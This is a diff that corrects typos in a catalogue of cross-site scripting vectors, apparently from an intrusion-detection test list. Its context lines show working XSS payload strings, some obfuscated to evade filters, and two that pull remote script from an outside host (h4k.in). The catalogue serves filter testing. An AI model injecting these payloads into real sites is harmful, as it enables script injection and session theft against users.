@@ -427,7 +427,7 @@ Author Name: ha.ckers.org
 Extraneous Open Brackets
 Exploit Name: Extraneous Open Brackets
 Exploit String: <<SCRIPT>alert("XSS");//<</SCRIPT>
-Exploit Description: (Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.
+Exploit Description: (Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorithm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to suppress a JavaScript error.
 Exploit Tags: general, obfuscated
 Author Name: ha.ckers.org
 
@@ -518,8 +518,8 @@ Exploit Description: HTML entities (the semicolons are required for this to work
 Exploit Tags: general, evil tags, obfuscated, internet explorer
 Author Name: ha.ckers.org
 
-HTML Quoute & Comment breaker
-Exploit Name: HTML Quoute & Comment breaker
+HTML Quote & Comment breaker
+Exploit Name: HTML Quote & Comment breaker
 Exploit String: '';!--"<script>alert(0);</script>=&{(alert(1))}
 Exploit Description: This vector breaks HTML quotes and comments.
 Exploit Tags: general, html breaking, comment breaking
@@ -547,7 +547,7 @@ Author Name: .mario
 IE closing-tag expression injection
 Exploit Name: IE closing-tag expression injection
 Exploit String: </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
-Exploit Description: This vector exploits a bug in IE whre attributes in closing comments are evaluated.
+Exploit Description: This vector exploits a bug in IE where attributes in closing comments are evaluated.
 Exploit Tags: general, injection, internet explorer
 Author Name: .mario
 
@@ -581,7 +581,7 @@ Exploit String: a=<a>
 </b>
 </a>
 document.write(unescape(a..b))
-Exploit Description: This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.
+Exploit Description: This vector writes an erroneous image tag with onerror handler inside an E4X construct into the document context.
 Exploit Tags: general, obfuscated, gecko, XML predicates, evil tags
 Author Name: .mario
 
@@ -865,7 +865,7 @@ Author Name: ha.ckers.org
 Mozilla -moz-binding-url injection
 Exploit Name: Mozilla -moz-binding-url injection
 Exploit String:  style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
-Exploit Description: The vector incudes a binding file via injected style attrbute. Gecko only.
+Exploit Description: The vector incudes a binding file via injected style attribute. Gecko only.
 Exploit Tags: general, injection, gecko, style injection, XBL
 Author Name: .mario
 
@@ -876,8 +876,8 @@ Exploit Description: This vector was once used on a major site to evade a stripp
 Exploit Tags: general, injection, gecko, style injection, XBL
 Author Name: PHPIDS Group
 
-Multiline selfcontained XSS
-Exploit Name: Multiline selfcontained XSS
+Multiline self-contained XSS
+Exploit Name: Multiline self-contained XSS
 Exploit String: _
 =
 eval
@@ -1274,7 +1274,7 @@ Author Name: PHPIDS Group
 Self-contained XSS variant 2
 Exploit Name: Self-contained XSS variant 2
 Exploit String: a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
-Exploit Description: Concatenates fragmented functions to evakuate the location hash
+Exploit Description: Concatenates fragmented functions to evaluate the location hash
 Exploit Tags: general, self contained
 Author Name: PHPIDS Group
 
@@ -1366,7 +1366,7 @@ content: “\61\6c\65\72\74\28\31\29″
 eval(eval(document.styleSheets[0].cssRules[0].style.content))
 </script>
 Exploit Description: This vector utilizes the CSS content property and fetches it off the document.styleSheets property afterwards. For correct execution of the payload a double-eval is needed.
-Exploit Tags: general, onfuscated, style injection
+Exploit Tags: general, obfuscated, style injection
 Author Name: .mario
 
 STYLE w/Anonymous HTML
